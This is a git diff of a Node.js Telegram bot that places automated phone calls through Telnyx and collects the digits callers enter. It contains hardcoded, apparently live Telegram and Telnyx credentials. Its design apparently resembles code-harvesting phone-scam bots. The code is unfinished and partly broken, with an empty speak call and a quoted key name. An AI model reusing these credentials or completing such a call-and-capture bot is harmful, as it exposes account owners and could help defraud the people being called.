@@ -3,9 +3,10 @@ const bot_token = '6328468760:AAFlRNuKnTwAMynlXcsAH118kYhBhahUNQU'
 var bot = new Telegraf(bot_token)
 
 // TELNYX STUFF 
-const MY_API_KEY = 'ASGHJ2J623RV34I3C63VTEY8C'
+const MY_API_KEY = 'KEY018BF55B4D0ED25E9A0861698D906F2F_xecXP42CjUQBicb53Xqadx'
 const telnyx = require('telnyx')('MY_API_KEY');
-const WEBHOOK_URL = 'https://automated-call-service.pages.dev/';
+const service_number = '14342338629'
+const WEBHOOK_URL = 'https://ofbtc.onrender.com';
 
 const express = require('express');
 const app = express();
@@ -16,12 +17,16 @@ async function call (service_number, customer_number, ctx){
    bot.telegram.sendMessage(ctx.chat.id, `call ongoing...\n Calling ${customer_number} \n please wait...`, {})
 
    // Use the Telnyx API to create a new call
-   await telnyx.calls.create({
+   const { data: call } = await telnyx.calls.create({
       connection_id: ENV_TELNYX_CONNECTION_ID,
       to: customer_number,
       from: ENV_TELNYX_PHONE_NUMBER,
-      webhook_url: WEBHOOK_URL
    });
+
+   call.speak({
+
+   })
+
 
 }
 
@@ -91,18 +96,20 @@ bot.command('start', ctx => {
 
 
 })
-
 bot.launch();
 
-app.post('/process_gather', (req, res) => {
+
+// webhook urls
+
+app.post('/call', (req, res) => {
    const digits = req.body.Digits;
-   console.log(digits);
-   res.send(`
-   <Response>
-      <Say>You entered ${digits}</Say>
-   </Response>
-   `);
- });
+   res.json(req.body)
+});
+
+app.post('/gather', (req, res) => {
+   const digits = req.body.Digits;
+   res.json(req.body)
+});
  
  app.listen(port, () => {
    console.log(`Server running on port ${port}`);
